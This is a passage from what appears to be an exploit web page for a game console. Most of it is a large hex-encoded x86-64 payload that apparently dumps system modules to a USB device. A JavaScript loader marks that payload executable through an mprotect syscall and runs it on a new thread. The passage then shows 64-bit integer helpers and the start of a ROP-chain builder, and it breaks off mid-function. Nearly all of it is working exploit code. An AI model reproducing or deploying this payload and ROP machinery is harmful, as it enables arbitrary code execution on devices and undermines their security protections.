0Xe9896774,0X44e2894c,0X8948fe89,0X448944df,0X5be80c24,0X44ffffff,0X0c24448b,0X0874c085,0Xff013b81,0X41756fff,0X48c06349,0X4830538b,0X4828c06b,0X4120738b,0X8d48c0ff,0X48ff164c,0X2148daf7,0Xf0014cca,0X10508948,0X18708948,0X08538b48,0X48388944,0X31085089,0X013b81d2,0X0f6fffff,0X5089c295,0Xc7ff4120,0X38c38348,0X894584eb,0X83480045,0X894c18c4,0X415d5bf0,0X415d415c,0Xc35f415e,0X56415741,0X89415541,0Xbe5441f5,0X00000601,0X89485355,0Xba5141d3,0X000001ff,0X4dce8941,0X85e8c489,0X83fffffa,0X840ffff8,0X000000e9,0X54b70f41,0X894c3824,0X89c789e6,0Xff3145c5,0X38d26b48,0X40c28348,0Xfffa53e8,0Xf73945ff,0X00b18d0f,0X8d480000,0X001a8705,0X7b8b4800,0X4810ff10,0X8949c085,0X8c840fc4,0X48000000,0X8d48c789,0X001b8b05,0X538b4800,0Xfff63110,0X207b8310,0X4b8b4800,0X48277418,0Xd2313363,0X44e0894d,0Xbae8ef89,0X85fffffd,0X485074c0,0X3108738b,0Xe8ef89d2,0Xfffffad8,0X10538b48,0Xf74833eb,0X0002bad9,0X89480000,0Xef8944ce,0Xfffabfe8,0X538b48ff,0Xe6894c18,0Xe8ef8944,0Xfffff9c0,0X08738b48,0Xef89d231,0Xfffaa3e8,0X538b48ff,0Xe6894c18,0Xb1e8ef89,0X48fffff9,0X1bae058d,0X894c0000,0X4110ffe7,0X8348c7ff,0X46e928c3,0X5affffff,0X5d5bef89,0X5d415c41,0X5f415e41,0Xfff99fe9,0X5d5b58ff,0X5d415c41,0X5f415e41,0X415641c3,0X55544155,0X48d23153,0X4910ec83,0Xf631f489,0Xfff96fe8,0Xfff883ff,0X00a8840f,0X31450000,0X41ff31c9,0X02b9c089,0Xba000000,0X00000003,0X004000be,0Xe8c58900,0X00000292,0Xfff88348,0X74c58949,0X58b70f6e,0X548d4818,0X44c70c24,0X00000c24,0Xc3ff0000,0X4805e3c1,0X0148db63,0X73b70fc3,0X43c76638,0Xc700003a,0X00003c43,0Xc7480000,0X00002843,0X8d480000,0X87e8407b,0X8bfffffd,0X890c244c,0Xc28948ee,0X4cd88949,0X8949e789,0Xfe3ee8c6,0X8d48ffff,0X001adb05,0Xf7894c00,0X00be10ff,0X4c000040,0X27e8ef89,0X48000002,0X8910c483,0X415d5bef,0X415d415c,0Xf8cae95e,0X8348ffff,0X5d5b10c4,0X5d415c41,0X41c35e41,0X41564157,0X55544155,0Xec814853,0X00000888,0X19058d48,0X4800001a,0X8949fb89,0X4810fff5,0X840fc085,0X00000103,0X0001ffbe,0Xef894c00,0Xe8c58948,0Xfffff908,0Xc1058d48,0X48000018,0X10ffef89,0X0fc08548,0X0000d284,0X358d4c00,0X000019e4,0X08608d4c,0Xf7358d48,0X4c00000d,0Xff41e789,0X74c08516,0X358d48cf,0X00000de5,0X41e7894c,0Xc08516ff,0X8d4cbe74,0X0019cf05,0Xbc8d4c00,0X00008024,0Xe1894c00,0X48da8948,0X0dc9358d,0X894c0000,0X41c031ff,0X8d4c10ff,0X0019ab0d,0Xb48d4c00,0X00048024,0Xe1894c00,0X48ea894c,0X0da5358d,0X894c0000,0X41c031f7,0X8d4811ff,0X4c082474,0X89e8ff89,0X85fffff8,0X61850fc0,0X8bffffff,0X66102444,0X66f00025,0X7540003d,0Xf6894c10,0Xe8ff894c,0Xffffff0f,0Xffff43e9,0X003d66ff,0X39850f80,0X4cffffff,0Xa6e8ff89,0X85fffffa,0X29840fc0,0X4cffffff,0X894cf689,0Xfe0fe8ff,0X19e9ffff,0X48ffffff,0X1972058d,0X89480000,0X4810ffef,0X0888c481,0X5d5b0000,0X5d415c41,0X5f415e41,0X415641c3,0X55544155,0Xfd894953,0X20ec8348,0X31f58948,0X058d48db,0X00001b90,0X0186a0bf,0X8310ff00,0X047f4ffb,0X02ebc3ff,0Xd889db31,0X00000ab9,0X8d4c9900,0X00179705,0X4cf9f700,0X0d24748d,0X8e158d48,0Xbe00000f,0X00000013,0X89f7894c,0Xc48941c1,0Xff41c031,0Xf7894c10,0X0001ffba,0X0601be00,0X05e80000,0X83fffff7,0Xc789fff8,0X05e89f74,0X4cfffff7,0X09e8f789,0X48fffff7,0X188a1d8d,0X89440000,0Xef894ce2,0X54358d48,0X3100000f,0X4413ffc0,0X8948e289,0X358d48ef,0X00000f49,0X13ffc031,0X20c48348,0X000001b8,0X415d5b00,0X415d415c,0Xc748c35e,0X0001ddc0,0X0ba0e900,0Xc7480000,0X000049c0,0X0b94e900,0Xc7480000,0X00004ac0,0X0b88e900,0Xc7480000,0X000041c0,0X0b7ce900,0Xc7480000,0X0000cbc0,0X0b70e900,0Xc7480000,0X0000ccc0,0X0b64e900,0Xc7480000,0X000223c0,0X0b58e900,0Xc7480000,0X00023cc0,0X0b4ce900,0X85480000,0X481d74ff,0X0e78f685,0X8548c031,0X481978c9,0X2473ce39,0X854812eb,0X480574ff,0X0679f685,0X000001b8,0Xc031c300,0X74f03948,0X0c8d48f3,0Xc0ff4807,0Xf0eb1188,0X74c83948,0X348d480b,0Xc0ff4807,0Xf0eb1688,0X41c3c031,0X48565354,0X15f61d8d,0X3b830000,0Xa0850f00,0X48000005,0X19e6058d,0X31450000,0Xc03145c9,0Xd231c931,0X8d48f631,0X000e633d,0X4810ff00,0X160a158d,0X8d480000,0X000e6b35,0X89c78900,0X0572e803,0X3b8b0000,0X60358d48,0X4800000e,0X17aa158d,0X5de80000,0X8b000005,0X358d483b,0X00000e50,0X0d158d48,0Xe8000016,0X00000548,0X8d483b8b,0X000e4235,0X158d4800,0X00001670,0X000533e8,0X483b8b00,0X0e35358d,0X8d480000,0X00170b15,0X051ee800,0X3b8b0000,0X29358d48,0X4800000e,0X16b6158d,0X09e80000,0X8b000005,0X358d483b,0X00000e1b,0X69158d48,0Xe8000015,0X000004f4,0X8d483b8b,0X000e0d35,0X158d4800,0X00001634,0X0004dfe8,0X483b8b00,0X0dff358d,0X8d480000,0X00152715,0X04cae800,0X3b8b0000,0Xf2358d48,0X4800000d,0X1622158d,0Xb5e80000,0X8b000004,0X358d483b,0X00000de7,0Xdd158d48,0Xe8000014,0X000004a0,0X8d483b8b,0X000dd935,0X158d4800,0X000015c0,0X00048be8,0X483b8b00,0X0dcc358d,0X8d480000,0X0014e315,0X0476e800,0X3b8b0000,0Xc1358d48,0X4800000d,0X1556158d,0X61e80000,0X8b000004,0X358d483b,0X00000db3,0Xb1158d48,0Xe8000015,0X0000044c,0X8d483b8b,0X000da635,0X158d4800,0X00001664,0X000437e8,0X483b8b00,0X0d98358d,0X8d480000,0X0015ff15,0X0422e800,0X3b8b0000,0X8a358d48,0X4800000d,0X153a158d,0X0de80000,0X8b000004,0X358d483b,0X00000d7d,0Xed158d48,0Xe8000015,0X000003f8,0X8d483b8b,0X000d7035,0X158d4800,0X00001448,0X0003e3e8,0X483b8b00,0X0d64358d,0X8d480000,0X00148315,0X03cee800,0X3b8b0000,0X5a358d48,0X4800000d,0X1516158d,0Xb9e80000,0X8b000003,0X358d483b,0X00000d4c,0X51158d48,0Xe8000014,0X000003a4,0Xe5258d4c,0X48000014,0X0d39358d,0X3b8b0000,0Xe8e2894c,0X0000038c,0X8d483b8b,0X000d2d35,0X158d4800,0X000015ac,0X000377e8,0X483b8b00,0X0d1f358d,0X8d480000,0X00141f15,0X0362e800,0X3b8b0000,0X12358d48,0X4800000d,0X145a158d,0X4de80000,0X8b000003,0X358d483b,0X00000d04,0Xbd158d48,0Xe8000014,0X00000338,0X894c3b8b,0X358d48e2,0X00000ccf,0X000327e8,0X483b8b00,0X0ce6358d,0X8d480000,0X00149f15,0X0312e800,0X3b8b0000,0Xd0358d48,0X4800000c,0X13ca158d,0Xfde80000,0X8b000002,0X358d483b,0X00000cc2,0Xf5158d48,0Xe8000014,0X000002e8,0X8d483b8b,0X000cb535,0X158d4800,0X000014f0,0X0002d3e8,0X483b8b00,0X0ca5358d,0X8d480000,0X00139315,0X02bee800,0X3b8b0000,0X95358d48,0X4800000c,0X13ce158d,0Xa9e80000,0X8b000002,0X358d483b,0X00000c88,0Xe9158d48,0Xe8000012,0X00000294,0X8d483b8b,0X000c7c35,0X158d4800,0X0000135c,0X00027fe8,0X483b8b00,0X0c72358d,0X8d480000,0X0013e715,0X026ae800,0X3b8b0000,0X64358d48,0X4800000c,0X139a158d,0X55e80000,0X8b000002,0X358d483b,0X00000c55,0Xfd158d48,0Xe8000013,0X00000240,0X8d483b8b,0X000c4135,0X158d4800,0X00001340,0X00022be8,0X483b8b00,0X0c31358d,0X8d480000,0X00125b15,0X0216e800,0X3b8b0000,0X24358d48,0X4800000c,0X139e158d,0X01e80000,0X8b000002,0X358d483b,0X00000c09,0Xd9158d48,0Xe8000012,0X000001ec,0X8d483b8b,0X000bfc35,0X158d4800,0X000013d4,0X0001d7e8,0X483b8b00,0X0be0358d,0X8d480000,0X00138f15,0X01c2e800,0X3b8b0000,0Xda358d48,0X4800000b,0X13d2158d,0Xade80000,0X8b000001,0X358d483b,0X00000bcc,0X7d158d48,0Xe8000013,0X00000198,0X8d483b8b,0X000bc035,0X158d4800,0X00001328,0X000183e8,0X483b8b00,0X0bb5358d,0X8d480000,0X00137315,0X016ee800,0X3b8b0000,0Xac358d48,0X4800000b,0X125e158d,0X59e80000,0X8b000001,0X358d483b,0X00000b9e,0X19158d48,0Xe8000013,0X00000144,0X8d483b8b,0X000b9135,0X158d4800,0X000011d4,0X00012fe8,0X483b8b00,0X0b84358d,0X8d480000,0X0011af15,0X011ae800,0X3b8b0000,0X79358d48,0X4800000b,0X134a158d,0X05e80000,0X8b000001,0X358d483b,0X00000b6c,0X6d158d48,0Xe8000011,0X000000f0,0X8d483b8b,0X000b5f35,0X158d4800,0X00001160,0X0000dbe8,0X483b8b00,0X0b54358d,0X8d480000,0X00130315,0X00c6e800,0X3b8b0000,0X48358d48,0X4800000b,0X11ce158d,0Xb1e80000,0X8b000000,0X358d483b,0X00000b39,0X39158d48,0Xe8000011,0X0000009c,0X8d483b8b,0X000b3035,0X158d4800,0X0000121c,0X000087e8,0X483b8b00,0X0b21358d,0X8d480000,0X0011e715,0X0072e800,0X3b8b0000,0X12358d48,0X4800000b,0X1272158d,0X5de80000,0X8b000000,0X358d483b,0X00000b04,0X45158d48,0Xe8000011,0X00000048,0X8d483b8b,0X000af535,0X158d4800,0X000011e8,0X000033e8,0X483b8b00,0X0ae6358d,0X8d480000,0X0011e315,0X001ee800,0X3b8b0000,0Xd8358d48,0X4800000a,0X10ee158d,0X5b590000,0X05e95c41,0X58000000,0Xc35c415b,0X4fc0c748,0Xe9000002,0X0000053a,0X50c0c748,0Xe9000002,0X0000052e,0X31f18948,0Xfe8948d2,0X50c03145,0X000252bf,0Xe8c03100,0X00000513,0X8d48c35a,0X00125f05,0Xd2634800,0X8b48c931,0X55e0ff00,0X8d485253,0X0012fb2d,0X007d8300,0X1f850f00,0X48000001,0X13421d8d,0X8d480000,0X000a6635,0X158d4800,0X00001314,0X8de83b8b,0X48ffffff,0X12d6158d,0X8d480000,0X000a5b35,0Xe83b8b00,0Xffffff78,0Xa9158d48,0X48000012,0X0a55358d,0X3b8b0000,0Xffff63e8,0X158d48ff,0X000012d4,0X51358d48,0X8b00000a,0Xff4ee83b,0X8d48ffff,0X00129f15,0X358d4800,0X00000a4b,0X39e83b8b,0X48ffffff,0X1272158d,0X8d480000,0X000a4635,0Xe83b8b00,0Xffffff24,0X45158d48,0X48000012,0X0a40358d,0X3b8b0000,0Xffff0fe8,0X158d48ff,0X00001268,0X3c358d48,0X8b00000a,0Xfefae83b,0X8d48ffff,0X00121315,0X358d4800,0X00000a3b,0Xe5e83b8b,0X48fffffe,0X1266158d,0X8d480000,0X000a3d35,0Xe83b8b00,0Xfffffed0,0Xf9158d48,0X48000011,0X0a3c358d,0X3b8b0000,0Xfffebbe8,0X158d48ff,0X00001224,0X3e358d48,0X8b00000a,0Xfea6e83b,0X8d48ffff,0X00120715,0X358d4800,0X00000a42,0X91e83b8b,0Xc7fffffe,0X00010045,0X5b580000,0Xc748c35d,0X000025c0,0X03c0e900,0Xc7480000,0X000036c0,0X03b4e900,0Xc7480000,0X00000bc0,0X03a8e900,0X54410000,0X8d485653,0X0011f71d,0X003b8300,0X038c850f,0X8d4c0000,0X00126725,0Xde894800,0Xfd3d8d48,0X49000009,0X002404c7,0Xe8000000,0Xfffffe48,0X2274c085,0X48de8948,0X09f13d8d,0X35e80000,0X85fffffe,0X480f74c0,0X8d48de89,0X0009f13d,0Xfe22e800,0X3b8bffff,0Xf6358d48,0X48000009,0X11a2158d,0Xf5e80000,0X8bfffffd,0X358d483b,0X000009f3,0Xcd158d48,0Xe8000011,0Xfffffde0,0X894c3b8b,0X358d48e2,0X000009ec,0Xfffdcfe8,0X483b8bff,0X09e6358d,0X8d480000,0X0011bf15,0Xfdbae800,0X3b8bffff,0Xe0358d48,0X48000009,0X11f2158d,0Xa5e80000,0X8bfffffd,0X358d483b,0X000009e4,0X0d158d48,0Xe8000012,0Xfffffd90,0X8d483b8b,0X0009ed35,0X158d4800,0X00001170,0Xfffd7be8,0X483b8bff,0X09f1358d,0X8d480000,0X00111b15,0Xfd66e800,0X3b8bffff,0Xf9358d48,0X48000009,0X1196158d,0X51e80000,0X8bfffffd,0X358d483b,0X000009f2,0Xe9158d48,0Xe8000011,0Xfffffd3c,0X8d483b8b,0X0009eb35,0X158d4800,0X0000113c,0Xfffd27e8,0X483b8bff,0X09e4358d,0X8d480000,0X00114f15,0Xfd12e800,0X3b8bffff,0Xde358d48,0X48000009,0X115a158d,0Xfde80000,0X8bfffffc,0X358d483b,0X000009d8,0Xb5158d48,0Xe8000010,0Xfffffce8,0X8d483b8b,0X0009d235,0X158d4800,0X00001160,0Xfffcd3e8,0X483b8bff,0X09cd358d,0X8d480000,0X00105315,0Xfcbee800,0X3b8bffff,0Xce358d48,0X48000009,0X1116158d,0Xa9e80000,0X8bfffffc,0X358d483b,0X000009d1,0X69158d48,0Xe8000010,0Xfffffc94,0X8d483b8b,0X0009d335,0X158d4800,0X0000108c,0Xfffc7fe8,0X483b8bff,0X09c5358d,0X8d480000,0X00113f15,0Xfc6ae800,0X3b8bffff,0Xbd358d48,0X48000009,0X1052158d,0X55e80000,0X8bfffffc,0X358d483b,0X000009b0,0Xfd158d48,0Xe800000f,0Xfffffc40,0X8d483b8b,0X0009a235,0X158d4800,0X000010c8,0Xfffc2be8,0X483b8bff,0X099a358d,0X8d480000,0X00107b15,0Xfc16e800,0X3b8bffff,0X9c358d48,0X48000009,0X10a6158d,0X01e80000,0X8bfffffc,0X358d483b,0X0000099d,0Xc9158d48,0Xe800000f,0Xfffffbec,0X8d483b8b,0X00099e35,0X158d4800,0X0000106c,0Xfffbd7e8,0X483b8bff,0X099f358d,0X8d480000,0X00108f15,0Xfbc2e800,0X3b8bffff,0Xa0358d48,0X48000009,0X0f92158d,0Xade80000,0X8bfffffb,0X358d483b,0X00000992,0X35158d48,0Xe800000f,0Xfffffb98,0X8d483b8b,0X00098435,0X158d4800,0X00000f48,0Xfffb83e8,0X483b8bff,0X0976358d,0X8d480000,0X00102b15,0Xfb6ee800,0X3b8bffff,0X68358d48,0X48000009,0X0f8e158d,0X59e80000,0X8bfffffb,0X358d483b,0X0000095a,0Xb9158d48,0Xe800000f,0Xfffffb44,0X8d483b8b,0X00094e35,0X158d4800,0X00000f4c,0Xfffb2fe8,0X483b8bff,0X0942358d,0X8d480000,0X000fcf15,0Xfb1ae800,0X3b8bffff,0X3e358d48,0X48000009,0X0f8a158d,0X05e80000,0X8bfffffb,0X358d483b,0X00000947,0X1d158d48,0Xe800000f,0Xfffffaf0,0X8d483b8b,0X00095335,0X158d4800,0X00000fa0,0Xfffadbe8,0X483b8bff,0X095e358d,0X8d480000,0X000f1b15,0X415b5900,0Xfac2e95c,0X5b58ffff,0X48c35c41,0X8949c031,0X72050fca,0X8348c301,0X000eca3d,0X18740000,0Xc115ff50,0X5900000e,0Xc7480889,0Xffffffc0,0Xc2c748ff,0Xffffffff,0X000000c3,0X00000000,0X5b000000,0X49544f4e,0X41434946,0X4e4f4954,0X25203a5d,0X63000a73,0X3a6c6d78,0X73702f2f,0X69746f6e,0X61636966,0X6e6f6974,0X7865742f,0X6f63695f,0X79735f6e,0X6d657473,0X6d754400,0X676e6970,0X00732520,0X7268746e,0X00646165,0X6e6e7552,0X20676e69,0X75646f4d,0X4420656c,0X65706d75,0X61570072,0X6e697469,0X6f662067,0X53552072,0X65642042,0X65636976,0X002e2e2e,0X502f7325,0X25003453,0X73252f73,0X2f732500,0X75646f6d,0X0073656c,0X2e2f7325,0X706d6f63,0X6574656c,0X646f4d00,0X73656c75,0X726c6120,0X79646165,0X6d756420,0X20646570,0X20726f66,0X202c7325,0X70696b73,0X676e6970,0X6d756420,0X676e6970,0X42535500,0X76656420,0X20656369,0X65746564,0X64657463,0X530a0a2e,0X74726174,0X20676e69,0X75646f6d,0X6420656c,0X69706d75,0X7420676e,0X7325206f,0X7325002e,0X7379732f,0X006d6574,0X732f7325,0X65747379,0X78655f6d,0X2f732500,0X61647075,0X25006574,0X696d2f73,0X732d696e,0X6f637379,0X652e6572,0X2500666c,0X61732f73,0X6f6d6566,0X652e6564,0X2500666c,0X63532f73,0X73795365,0X6f437641,0X6f72746e,0X6c652e6c,0X6f4d0066,0X656c7564,0X75642073,0X6465706d,0X63757320,0X73736563,0X6c6c7566,0X55002179,0X7075736e,0X74726f70,0X66206465,0X776d7269,0X00657261,0Xffffde30,0Xffffde30,0Xffffde30,0Xffffde30,0Xffffdd60,0Xffffdd60,0Xffffdfaf,0Xffffdfaf,0Xffffdfaf,0Xffffdd80,0Xffffdda0,0Xffffddc0,0Xffffde1b,0Xffffde1b,0Xffffdf8f,0Xffffde3b,0Xffffdf8f,0Xffffde3b,0Xffffdf8f,0Xffffde3b,0Xffffe374,0Xffffe374,0Xffffe374,0Xffffe374,0Xffffe2ef,0Xffffe2ef,0Xffffe545,0Xffffe545,0Xffffe545,0Xffffe2ef,0Xffffe2ef,0Xffffe2ef,0Xffffe366,0Xffffe366,0Xffffe525,0Xffffe38d,0Xffffe525,0Xffffe38d,0Xffffe525,0Xffffe38d,0X6573752f,0X6a2e2f72,0X626c6961,0X6b616572,0X73252f00,0X6d6f632f,0X2f6e6f6d,0X2f62696c,0X6362696c,0X7270732e,0X732f0078,0X65747379,0X6f632f6d,0X6e6f6d6d,0X62696c2f,0X62696c2f,0X70732e63,0X25007872,0X786c3230,0X6c323025,0X2e300078,0X00632530,0X63252e30,0X25006325,0X2e632563,0X63256325,0X79732f00,0X6d657473,0X6d6f632f,0X2f6e6f6d,0X2f62696c,0X5362696c,0X79536563,0X69745573,0X70732e6c,0X73007872,0X79536563,0X69745573,0X6e65536c,0X73795364,0X4e6d6574,0X6669746f,0X74616369,0X576e6f69,0X54687469,0X00747865,0X7379732f,0X2f6d6574,0X6d6d6f63,0X6c2f6e6f,0X6c2f6269,0X63536269,0X73795365,0X536d6574,0X69767265,0X732e6563,0X00787270,0X53656373,0X65747379,0X7265536d,0X65636976,0X6e75614c,0X65576863,0X6f724262,0X72657377,0X6e6d2f00,0X73752f74,0X2f692562,0X6f72702e,0X55006562,0X69254253,0X6e6d2f00,0X73752f74,0X00692562,0X5362696c,0X694c6563,0X6e496362,0X6e726574,0X732e6c61,0X00787270,0X6c6c616d,0X6600636f,0X00656572,0X6c6c6163,0X7200636f,0X6c6c6165,0X6d00636f,0X6c616d65,0X006e6769,0X736d656d,0X6d007465,0X70636d65,0X656d0079,0X706d636d,0X6d656d00,0X65766f6d,0X6d656d00,0X65766f6d,0X7300735f,0X70637274,0X74730079,0X70636e72,0X74730079,0X70636e72,0X00735f79,0X63727473,0X73007461,0X636e7274,0X73007461,0X656c7274,0X7473006e,0X706d6372,0X72747300,0X706d636e,0X72707300,0X66746e69,0X706e7300,0X746e6972,0X6e730066,0X6e697270,0X735f6674,0X63737300,0X00666e61,0X74727473,0X73006c6f,0X6f747274,0X7473006b,0X72686372,0X72747300,0X72686372,0X72747300,0X00727473,0X64727473,0X72007075,0X65646e69,0X73690078,0X69676964,0X74610074,0X6100696f,0X00666f74,0X6c727473,0X00797063,0X65727473,0X726f7272,0X65475f00,0X74637074,0X00657079,0X6f74535f,0X62006c75,0X79706f63,0X61727300,0X6100646e,0X69746373,0X6100656d,0X69746373,0X725f656d,0X746d6700,0X00656d69,0X69746d67,0X735f656d,0X636f6c00,0X69746c61,0X6c00656d,0X6c61636f,0X656d6974,0X6d00725f,0X6d69746b,0X706f0065,0X69646e65,0X65720072,0X69646461,0X65720072,0X69646461,0X00725f72,0X6c6c6574,0X00726964,0X6b656573,0X00726964,0X69776572,0X6964646e,0X6c630072,0X6465736f,0X64007269,0X64667269,0X74656700,0X676f7270,0X656d616e,0X706f6600,0X66006e65,0X64616572,0X72776600,0X00657469,0X65657366,0X7466006b,0X006c6c65,0X6f6c6366,0X66006573,0X6e697270,0X73006674,0X74506563,0X61657268,0X65724364,0X00657461,0X50656373,0X65726874,0X78456461,0X73007469,0X74506563,0X61657268,0X74654464,0X00686361,0X50656373,0X65726874,0X6f4a6461,0X73006e69,0X74506563,0X61657268,0X65695964,0X7300646c,0X74506563,0X61657268,0X6c655364,0X63730066,0X68745065,0X64616572,0X636e6143,0X73006c65,0X74506563,0X61657268,0X74754d64,0X6e497865,0X73007469,0X74506563,0X61657268,0X74754d64,0X65447865,0X6f727473,0X63730079,0X68745065,0X64616572,0X6574754d,0X636f4c78,0X6373006b,0X68745065,0X64616572,0X6574754d,0X79725478,0X6b636f6c,0X65637300,0X72687450,0X4d646165,0X78657475,0X656d6954,0X636f6c64,0X6373006b,0X68745065,0X64616572,0X6574754d,0X6c6e5578,0X006b636f,0X6b62696c,0X656e7265,0X70732e6c,0X6c007872,0X656b6269,0X6c656e72,0X6265775f,0X7270732e,0X696c0078,0X72656b62,0X5f6c656e,0X2e737973,0X78727073,0X735f5f00,0X6b636174,0X6b68635f,0X6175675f,0X5f006472,0X6174735f,0X635f6b63,0X665f6b68,0X006c6961,0X72655f5f,0X00726f72,0X4b656373,0X656e7265,0X7272456c,0X7300726f,0X654b6563,0X6c656e72,0X64616f4c,0X72617453,0X646f4d74,0X00656c75,0X4b656373,0X656e7265,0X6c6c416c,0X7461636f,0X72694465,0X4d746365,0X726f6d65,0X63730079,0X72654b65,0X4d6c656e,0X69447061,0X74636572,0X6f6d654d,0X73007972,0X654b6563,0X6c656e72,0X44746547,0X63657269,0X6d654d74,0X5379726f,0X00657a69,0X4b656373,0X656e7265,0X6174536c,0X63730074,0X72654b65,0X4f6c656e,0X006e6570,0X4b656373,0X656e7265,0X6165526c,0X63730064,0X72654b65,0X4c6c656e,0X6b656573,0X65637300,0X6e72654b,0X6c436c65,0X0065736f,0X4b656373,0X656e7265,0X656c536c,0X73007065,0X654b6563,0X6c656e72,0X656c7355,0X73007065,0X654b6563,0X6c656e72,0X74746547,0X6f656d69,0X79616466,0X65637300,0X6e72654b,0X65476c65,0X6f725074,0X73736563,0X656d6954,0X65637300,0X6e72654b,0X65476c65,0X72754374,0X746e6572,0X00757043,0X63737973,0X73006c74,0X74637379,0X6e79626c,0X00656d61,0X61737973,0X00686372,0X63657865,0X70006576,0X65726874,0X735f6461,0X00666c65,0X72687470,0X5f646165,0X61746573,0X6e696666,0X5f797469,0X7300706e,0X654b6563,0X6c656e72,0X61657243,0X71456574,0X65756575,0X65637300,0X6e72654b,0X65446c65,0X6574656c,0X65757145,0X73006575,0X654b6563,0X6c656e72,0X55646441,0X45726573,0X746e6576,0X65637300,0X6e72654b,0X64416c65,0X61655264,0X65764564,0X6700746e,0X69757465,0X65670064,0X64696774,0X74656700,0X00646970,0X75746573,0X73006469,0X69677465,0X65730064,0X75657274,0X73006469,0X65727465,0X00646967,0X4b656373,0X656e7265,0X7465476c,0X73506449,0X65637300,0X6e72654b,0X65476c65,0X65704f74,0X4973506e,0X726f4664,0X74737953,0X73006d65,0X654b6563,0X6c656e72,0X646e6553,0X69746f4e,0X61636966,0X6e6f6974,0X75716552,0X00747365,0X4b656373,0X656e7265,0X7465476c,0X61537346,0X6f62646e,0X6e615278,0X576d6f64,0X0064726f,0X4b656373,0X656e7265,0X7465476c,0X74737953,0X77536d65,0X73726556,0X006e6f69,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000001,0X00000001,0X00000001,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X6ffffef5,0X00000000,0X00003760,0X00000000,0X00000005,0X00000000,0X00003758,0X00000000,0X00000006,0X00000000,0X00003740,0X00000000,0X0000000a,0X00000000,0X00000001,0X00000000,0X0000000b,0X00000000,0X00000018,0X00000000,0X00000015,0X00000000,0X00000000,0X00000000,0X0000001e,0X00000000,0X00000008,0X00000000,0X6ffffffb,0X00000000,0X08000001,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000014,0X00000001,0Xffffffff];
	var bufLen = payload.length * 4
	var payload_loader = p.malloc32(bufLen);
	var loader_writer = payload_loader.backing;
	for(var i=0; i < payload.length; i++)
	{
		loader_writer[i] = payload[i];
	}
	chain.syscall(74, payload_loader, bufLen, (0x1 | 0x2 | 0x4));
	var pthread = p.malloc(0x10);
	chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
	showMessage("Payload Loaded.");
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
</script>
<script>
function int64(low, hi) {
    this.low = (low >>> 0);
    this.hi = (hi >>> 0);

    this.add32inplace = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.add32 = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32 = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32inplace = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.and32 = function (val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }

    this.and64 = function (vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }

    this.toString = function (val) {
        val = 16;
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);

        if (this.hi == 0)
            return lo_str;
        else
            lo_str = zeroFill(lo_str, 8)

        return hi_str + lo_str;
    }

    return this;
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}
</script>
<script>
const stack_sz = 0x40000;
const reserve_upper_stack = 0x10000;
const stack_reserved_idx = reserve_upper_stack / 4;


// Class for quickly creating and managing a ROP chain
window.rop = function () {
    this.stackback = p.malloc32(stack_sz / 4 + 0x8);
    this.stack = this.stackback.add32(reserve_upper_stack);
    this.stack_array = this.stackback.backing;
    this.retval = this.stackback.add32(stack_sz);
    this.count = 1;
    this.branches_count = 0;
    this.branches_rsps = p.malloc(0x200);

    this.clear = function () {
        this.count = 1;
        this.branches_count = 0;

        for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
            this.stack_array[i + stack_reserved_idx] = 0;
        }
    };

    this.pushSymbolic = function () {
        this.count++;
        return this.count - 1;
    }

    this.finalizeSymbolic = function (idx, val) {
        if (val instanceof int64) {
            this.stack_array[stack_reserved_idx + idx * 2] = val.low;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
        } else {
            this.stack_array[stack_reserved_idx + idx * 2] = val;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
        }
    }

    this.push = function (val) {
        this.finalizeSymbolic(this.pushSymbolic(), val);
    }

    this.push_write8 = function (where, what) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["pop rsi"]);
        this.push(what);
        this.push(gadgets["mov [rdi], rsi"]);
    }

    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        if (rdi != undefined) {
            this.push(gadgets["pop rdi"]);
            this.push(rdi);
        }

        if (rsi != undefined) {
            this.push(gadgets["pop rsi"]);
            this.push(rsi);
        }

        if (rdx != undefined) {
            this.push(gadgets["pop rdx"]);
            this.push(rdx);
        }

        if (rcx != undefined) {
            this.push(gadgets["pop rcx"]);
            this.push(rcx);
        }

        if (r8 != undefined) {
            this.push(gadgets["pop r8"]);
            this.push(r8);
        }

        if (r9 != undefined) {
